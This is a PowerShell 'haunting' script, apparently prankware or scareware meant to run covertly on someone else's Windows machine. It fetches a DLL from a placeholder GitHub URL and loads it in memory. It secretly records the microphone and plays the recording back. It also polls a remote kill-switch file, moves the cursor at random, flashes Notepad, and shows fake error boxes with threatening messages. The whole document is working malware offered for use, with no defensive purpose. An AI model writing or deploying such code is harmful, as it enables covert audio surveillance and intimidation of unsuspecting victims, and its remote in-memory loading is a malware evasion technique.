# In-memory Haunting Script with Kill Switch

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName PresentationFramework

# Load NAudio from memory (will assume you host the DLL separately if needed)
$naudioUrl = "https://github.com/YOUR_USERNAME/YOUR_REPO/raw/main/NAudio.dll"
$naudioBytes = Invoke-WebRequest $naudioUrl -UseBasicParsing
$assembly = [System.Reflection.Assembly]::Load($naudioBytes.Content)

$waveIn = New-Object NAudio.Wave.WaveInEvent
$waveFile = "$env:TEMP\ghost_record.wav"
$writer = New-Object NAudio.Wave.WaveFileWriter $waveFile, $waveIn.WaveFormat
$waveIn.DataAvailable += {
    param($s, $a)
    $writer.Write($a.Buffer, 0, $a.BytesRecorded)
}
$waveIn.StartRecording()

while ($true) {
    # Kill switch: if kill.txt is deleted/404, exit
    try {
        $status = (Invoke-WebRequest "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/kill.txt" -UseBasicParsing).StatusCode
        if ($status -ne 200) { break }
    } catch {
        break
    }

    Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 25)

    $pos = [System.Windows.Forms.Cursor]::Position
    $x = [int]$pos.X
    $y = [int]$pos.Y
    $dx = [int](Get-Random -Minimum -30 -Maximum 30)
    $dy = [int](Get-Random -Minimum -30 -Maximum 30)
    $newX = $x + $dx
    $newY = $y + $dy
    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($newX, $newY)

    if ((Get-Random -Minimum 1 -Maximum 10) -eq 3) {
        $original = [System.Windows.Forms.Cursor]::Position
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $corner = if ((Get-Random -Minimum 0 -Maximum 2) -eq 0) {
            New-Object System.Drawing.Point(0, 0)
        } else {
            New-Object System.Drawing.Point($screen.Width - 1, $screen.Height - 1)
        }
        [System.Windows.Forms.Cursor]::Position = $corner
        Start-Sleep -Milliseconds 300
        [System.Windows.Forms.Cursor]::Position = $original
    }

    if ((Get-Random -Minimum 1 -Maximum 30) -eq 7) {
        Start-Process notepad
        Start-Sleep -Seconds 1
        Get-Process notepad | Stop-Process
    }

    if ((Get-Random -Minimum 1 -Maximum 25) -eq 5) {
        $waveIn.StopRecording(); $writer.Dispose()
        Start-Sleep -Milliseconds 300
        $player = New-Object NAudio.Wave.AudioFileReader $waveFile
        $output = New-Object NAudio.Wave.WaveOutEvent
        $output.Init($player)
        $output.Play()
        while ($output.PlaybackState -eq 'Playing') {
            Start-Sleep -Milliseconds 200
        }
        $writer = New-Object NAudio.Wave.WaveFileWriter $waveFile, $waveIn.WaveFormat
        $waveIn.StartRecording()
    }

    if ((Get-Random -Minimum 1 -Maximum 15) -eq 6) {
        $msg = Get-Random -InputObject @(
            "I know what you did.",
            "You shouldn't have opened that.",
            "They're watching.",
            "Stop looking behind you.",
            "This isn't your computer anymore."
        )
        [System.Windows.MessageBox]::Show($msg, "System Alert", "OK", "Error")
    }
}
